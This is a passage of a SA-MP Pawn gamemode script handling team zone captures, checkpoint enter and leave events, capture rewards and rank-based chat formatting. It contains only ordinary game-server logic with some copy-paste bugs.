    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Abandoned City ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Arbandoned City 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingCity(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][CITY] = 1;
	UnderAttack[CITY] = 0;
	KillTimer(timer[playerid][CITY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][CITY] = 25;
    GangZoneStopFlashForAll(Zone[CITY]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][CITY] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"[ZONE]You have failed to capture this zone! Quick, RECAPTURE IT!");
	return 1;
}
forward City(playerid);
public City(playerid)
{
	CityCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveCluckin(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0 || gTeam[playerid] != TEAM_MERC)
	{
		if(UnderAttack[CLUCKIN] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[CLUCKIN] = 1;
			 	timer[playerid][CLUCKIN] = SetTimerEx("Cluckin", 25000, false,"i",playerid);
			 	Captured[playerid][CLUCKIN] = 0;
				 SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score!");
				 GameTextForPlayer(playerid,"~r~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[CLUCKIN], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[CLUCKIN], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[CLUCKIN], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[CLUCKIN], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[CLUCKIN], TEAM_ZONE_AUS_COLOR);
				}
				//------Message-----
			    if(tCP[CLUCKIN] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Fast Food Station is under attack!");
			    }
			    else if(tCP[CLUCKIN] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Fast Food Station is under attack!");
			    }
			    else if(tCP[CLUCKIN] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Fast Food Station is under attack!");
				}
				else if(tCP[CLUCKIN] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Fast Food Station is under attack!");
				}
				else if(tCP[CLUCKIN] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Fast Food Station is under attack!");
				}
				else if(tCP[CLUCKIN] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][CLUCKIN] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock CluckinCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][CLUCKIN] = 1;
	UnderAttack[CLUCKIN] = 0;
	KillTimer(timer[playerid][CLUCKIN]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][CLUCKIN] = 25;
	GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    TextDrawShowForPlayer(playerid, Rank1[playerid]);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][CITY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"Your team has captured "cred"Fast Food Station"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[CLUCKIN] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[CLUCKIN]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[CLUCKIN], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[CLUCKIN], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[CLUCKIN], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[CLUCKIN], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[CLUCKIN], TEAM_ZONE_AUS_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured Fast Food Station for team %s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Fast Food 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingCluckin(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][CLUCKIN] = 1;
	UnderAttack[CLUCKIN] = 0;
	KillTimer(timer[playerid][CLUCKIN]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][CLUCKIN] = 25;
    GangZoneStopFlashForAll(Zone[CLUCKIN]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][CLUCKIN] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"[ZONE]You have failed to capture this zone! Quick, RECAPTURE IT!");
	return 1;
}
forward Cluckin(playerid);
public Cluckin(playerid)
{
	CluckinCaptured(playerid);
	return 1;
}
//=====================================================================================
//================================== SUBS====================================
//===============S SUBS ====================================================
stock ActiveSubs(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[SUBS] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
                for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[SUBS] = 1;
			 	timer[playerid][SUBS] = SetTimerEx("Subs", 25000, false,"i",playerid);
			 	Captured[playerid][SUBS] = 0;
			 	SendClientMessage(playerid, C_PINK,"Stay in this checkpoint for 25 seconds to capture!");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[SUBS], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[SUBS] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, C_LORANGE,"[ZONE-ATTACK]Submarines is under attack.");
			    }
			    else if(tCP[SUBS] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, C_LORANGE,"[ZONE-ATTACK]Submarines is under attack.");
			    }
			    else if(tCP[SUBS] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, C_LORANGE,"[ZONE-ATTACK]Submarines is under attack.");
				}
				else if(tCP[SUBS] == TEAM_MARVEL)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<Vietnam>");
			      SendTeamMessage(TEAM_MARVEL, C_LORANGE,"[ZONE-ATTACK]Submarines  is under attack.");
				}
				else if(tCP[SUBS] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, C_LORANGE,"[ZONE-ATTACK]Submarines is under attack.");
				}
				else if(tCP[SUBS] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, C_LORANGE,"[ZONE-ATTACK]Submarines is under attack.");
				}
				else if(tCP[SUBS] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][SUBS] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock SubsCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][SUBS] = 1;
	UnderAttack[SUBS] = 0;
	KillTimer(timer[playerid][SUBS]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SUBS] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
	GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);

	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][SUBS] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Snakes farm"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[SUBS] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[SUBS]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_AUS_COLOR);
    }
    else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[SUBS], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Submarines ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Submarines 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
    
	return 1;
}
stock LeavingSubs(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][SUBS] = 1;
	UnderAttack[SUBS] = 0;
	KillTimer(timer[playerid][SUBS]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SUBS] = 25;
    GangZoneStopFlashForAll(Zone[SUBS]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][SUBS] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://picosong.com/fB6m/");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Subs(playerid);
public Subs(playerid)
{
	SubsCaptured(playerid);
	return 1;
}


//==============================================================================
//============================[ OnPlayerEnter and OnPlayerLeave Dynamic CP]=====
//==============================================================================
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	if(checkpointid == park)
	{
	    new pstring[128];
	    format(pstring,sizeof(pstring), "%s has finished the course first!", GetName(playerid));
		SetPlayerScore(playerid, GetPlayerScore(playerid) +10);
		GivePlayerMoney(playerid, 2000);
		GivePlayerScore(playerid,2);
		SendClientMessage(playerid,blue, "Congratulations! You've finished the course!");
		SendClientMessageToAll(red, pstring);
	}
	if(checkpointid == CP[SNAKE])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[SNAKE] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[SNAKE] != gTeam[playerid]) {
						CountVar[playerid][SNAKE] = 25;
						ActiveSnakeFarm(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BAY])
	{
        if(Spectating[playerid] == 0) {
			if(UnderAttack[BAY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BAY] != gTeam[playerid]) {
						CountVar[playerid][BAY] = 25;
						ActiveBay(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BIG])
	{
        if(Spectating[playerid] == 0) {
			if(UnderAttack[BIG] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BIG] != gTeam[playerid]) {
						CountVar[playerid][BIG] = 25;
						ActiveArea51(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[ARMY])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[ARMY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[ARMY] != gTeam[playerid]) {
						CountVar[playerid][ARMY] = 25;
						ActiveArmy(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[PETROL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[PETROL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[PETROL] != gTeam[playerid]) {
						CountVar[playerid][PETROL] = 25;
						ActivePetrol(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[OIL])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[OIL] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[OIL] != gTeam[playerid]) {
						CountVar[playerid][OIL] = 25;
						ActiveOil(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[DESERT])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[DESERT] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[DESERT] != gTeam[playerid]) {
						CountVar[playerid][DESERT] = 25;
						ActiveDesert(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[QUARRY])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[QUARRY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[QUARRY] != gTeam[playerid]) {
						CountVar[playerid][QUARRY] = 25;
						ActiveQuarry(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[GUEST])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[GUEST] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[GUEST] != gTeam[playerid]) {
						CountVar[playerid][GUEST] = 25;
						ActiveGuest(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[EAR])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[EAR] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[EAR] != gTeam[playerid]) {
						CountVar[playerid][EAR] = 25;
						ActiveEar(playerid);
					} else return SendClientMessage(playerid, red,"[ZONE]This zone is already captured by your team! Look for some other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[CITY])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[CITY] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[CITY] != gTeam[playerid]) {
						CountVar[playerid][CITY] = 25;
						ActiveCity(playerid);
					} else return SendClientMessage(playerid, -1,"[ZONE]This zone is controlled by your team! Look for any other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[CLUCKIN])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[CLUCKIN] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[CLUCKIN] != gTeam[playerid]) {
						CountVar[playerid][CLUCKIN] = 25;
						ActiveCluckin(playerid);
					} else return SendClientMessage(playerid, -1,"[ZONE]This zone is controlled by your team! Look for any other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[BRIDGE])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[BRIDGE] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[BRIDGE] != gTeam[playerid]) {
						CountVar[playerid][BRIDGE] = 25;
						ActiveBridge(playerid);
					} else return SendClientMessage(playerid, -1,"[ZONE]This zone is controlled by your team! Look for any other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	else if(checkpointid == CP[SUBS])
	{
		if(Spectating[playerid] == 0) {
			if(UnderAttack[SUBS] == 0) {
				if(PlayerInfo[playerid][OnDuty] == 0) {
					if(tCP[SUBS] != gTeam[playerid]) {
						CountVar[playerid][SUBS] = 25;
						ActiveSubs(playerid);
					} else return SendClientMessage(playerid, -1,"[ZONE]This zone is controlled by your team! Look for any other zone!");
				} else return CaptureZoneMessage(playerid, 3);
			} else return CaptureZoneMessage(playerid, 2);
		} else return 0;
	}
	return 1;
}
public OnPlayerLeaveDynamicCP(playerid, checkpointid)
{
	if(checkpointid == CP[SNAKE] && Captured[playerid][SNAKE] == 0 && IsPlayerCapturing[playerid][SNAKE] == 1 && !IsPlayerInDynamicCP(playerid, CP[SNAKE]))
	{
		LeavingSnakeFarm(playerid);
	}
	if(checkpointid == CP[BAY] && Captured[playerid][BAY] == 0 && IsPlayerCapturing[playerid][BAY] == 1 && !IsPlayerInDynamicCP(playerid, CP[BAY]))
	{
		LeavingBay(playerid);
	}
	if(checkpointid == CP[BIG] && Captured[playerid][BIG] == 0 && IsPlayerCapturing[playerid][BIG] == 1 && !IsPlayerInDynamicCP(playerid, CP[BIG]))
	{
		LeavingArea51(playerid);
	}
	if(checkpointid == CP[ARMY] && Captured[playerid][ARMY] == 0 && IsPlayerCapturing[playerid][ARMY] == 1 && !IsPlayerInDynamicCP(playerid, CP[ARMY]))
	{
		LeavingArmy(playerid);
	}
	if(checkpointid == CP[PETROL] && Captured[playerid][PETROL] == 0 && IsPlayerCapturing[playerid][PETROL] == 1 && !IsPlayerInDynamicCP(playerid, CP[PETROL]))
	{
		LeavingPetrol(playerid);
	}
	if(checkpointid == CP[OIL] && Captured[playerid][OIL] == 0 && IsPlayerCapturing[playerid][OIL] == 1 && !IsPlayerInDynamicCP(playerid, CP[OIL]))
	{
		LeavingOil(playerid);
	}
	if(checkpointid == CP[DESERT] && Captured[playerid][DESERT] == 0 && IsPlayerCapturing[playerid][DESERT] == 1 && !IsPlayerInDynamicCP(playerid, CP[DESERT]))
	{
		LeavingDesert(playerid);
	}
	if(checkpointid == CP[QUARRY] && Captured[playerid][QUARRY] == 0 && IsPlayerCapturing[playerid][QUARRY] == 1 && !IsPlayerInDynamicCP(playerid, CP[QUARRY]))
	{
		LeavingQuarry(playerid);
	}
	if(checkpointid == CP[GUEST] && Captured[playerid][GUEST] == 0 && IsPlayerCapturing[playerid][GUEST] == 1 && !IsPlayerInDynamicCP(playerid, CP[GUEST]))
	{
		LeavingGuest(playerid);
	}
	if(checkpointid == CP[EAR] && Captured[playerid][EAR] == 0 && IsPlayerCapturing[playerid][EAR] == 1 && !IsPlayerInDynamicCP(playerid, CP[EAR]))
	{
		LeavingEar(playerid);
	}
	if(checkpointid == CP[CITY] && Captured[playerid][CITY] == 0 && IsPlayerCapturing[playerid][CITY] == 1 && !IsPlayerInDynamicCP(playerid, CP[CITY]))
 	{
		LeavingCity(playerid);
	}
	if(checkpointid == CP[CLUCKIN] && Captured[playerid][CLUCKIN] == 0 && IsPlayerCapturing[playerid][CLUCKIN] == 1 && !IsPlayerInDynamicCP(playerid, CP[CLUCKIN]))
	{
		LeavingCluckin(playerid);
	}
	if(checkpointid == CP[BRIDGE] && Captured[playerid][BRIDGE] == 0 && IsPlayerCapturing[playerid][BRIDGE] == 1 && !IsPlayerInDynamicCP(playerid, CP[BRIDGE]))
	{
		LeavingBridge(playerid);
	}
	return 1;
}
//==============================================================================
public OnPlayerText(playerid, text[])
{
    if(text[0] == '!' && (PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1)) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"MOD.Chat:[%i]%s: %s",playerid,string,text[1]);
		MessageToTwice(0x8000FFC8,string);
		return 0;
	}
	if(text[0] == '.' && PlayerInfo[playerid][Level] >= 2) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"A.Chat:[%i]%s: %s",playerid,string,text[1]);
		MessageToAdmins2plus(C_PINK,string);
		return 0;
	}
	if(text[0] == ',' && PlayerInfo[playerid][Level] >= 5) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"Management.Chat:[%i]%s: %s",playerid,string,text[1]);
		MessageTo5(GREEN,string);
	    return 0;
	}
	if(text[0] == '@' && PlayerInfo[playerid][Level] >= 9) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string,sizeof(string),"Exec.Chat:[%i]%s: %s",playerid,string,text[1]);
		MessageToOwner(0xFF0000FF,string);
		return 0;
	}
	if(text[0] == '*' && PlayerInfo[playerid][dRank] >= 1) {
	    new string[128]; GetPlayerName(playerid,string,sizeof(string));
		format(string, sizeof(string), ""cred"V.I.P.Chat:"cgreen"[%i]"cblue"%s:"cwhite" %s",playerid, string, text[1]);
		MessageToDonor(-1,string);
		return 0;
	}

 	if((PlayerInfo[playerid][dRank] >= 3)&&(dsay==0))
	  {
	    new aName[MAX_PLAYER_NAME], string2[128];
	    GetPlayerName(playerid, aName,sizeof(aName));
	    format(string2,sizeof(string2),"{FF0000}[DONOR] {FFFF00}%s says: {FFFFFF}%s",aName,text);
	    printf(string2);
	    SendClientMessageToAll(0xF600F6FF,string2);
        return 0;
		}

	    
	if (PlayerInfo[playerid][Muted] == 0)
	{
		if((PlayerInfo[playerid][Level] == 1)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Moderator]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }

        if((PlayerInfo[playerid][Level] == 2)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Server-Admin]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 3)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Senior-Admin]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }

        if((PlayerInfo[playerid][Level] == 4)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Lead-Admin]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 5)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Head-Admin]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 6)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

	        new PlayerName[MAX_PLAYER_NAME];
            GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
            format(text, 1024, "%d - [Server-Manager]%s says:{FFFFFF} %s",playerid, PlayerName, text);
            SendClientMessageToAll(GetPlayerColor(playerid), text);
            return 0;
        }
        if((PlayerInfo[playerid][Level] == 7)&&(PlayerInfo[playerid][Hide] == 0 && PlayerInfo[playerid][OnDuty] >= 1))
		{

